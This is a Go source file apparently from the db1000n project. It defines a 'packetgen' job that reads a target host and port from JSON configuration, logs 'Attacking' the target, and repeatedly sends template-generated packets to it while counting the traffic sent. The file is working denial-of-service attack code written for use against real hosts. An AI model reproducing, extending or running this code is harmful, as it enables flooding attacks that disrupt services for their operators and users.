package jobs

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"strconv"

	"github.com/google/uuid"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/packetgen"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func packetgenJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	type packetgenJobConfig struct {
		BasicJobConfig
		Packet json.RawMessage
		Host   string
		Port   string
	}

	var jobConfig packetgenJobConfig

	if err := json.Unmarshal(args, &jobConfig); err != nil {
		log.Printf("Error parsing json: %v", err)
		return err
	}

	host := templates.ParseAndExecute(jobConfig.Host, nil)
	port, err := strconv.Atoi(templates.ParseAndExecute(jobConfig.Port, nil))
	if err != nil {
		log.Printf("Error parsing port: %v", err)
		return err
	}

	packetTpl, err := templates.Parse(string(jobConfig.Packet))
	if err != nil {
		return fmt.Errorf("error parsing packet config template %q: %v", string(jobConfig.Packet), err)
	}

	log.Printf("Attacking %v:%v", jobConfig.Host, jobConfig.Port)

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())

	for jobConfig.Next(ctx) {
		packetConfigBytes := []byte(templates.Execute(packetTpl, nil))
		if debug {
			log.Printf("[packetgen] Rendered packet config template:\n%s", string(packetConfigBytes))
		}

		var packetConfig packetgen.PacketConfig
		if err := json.Unmarshal(packetConfigBytes, &packetConfig); err != nil {
			log.Printf("Error parsing json: %v", err)
			return err
		}

		len, err := packetgen.SendPacket(packetConfig, host, port)
		if err != nil {
			log.Printf("Error sending packet: %v", err)
			return err
		}

		trafficMonitor.Add(len)
	}

	return nil
}
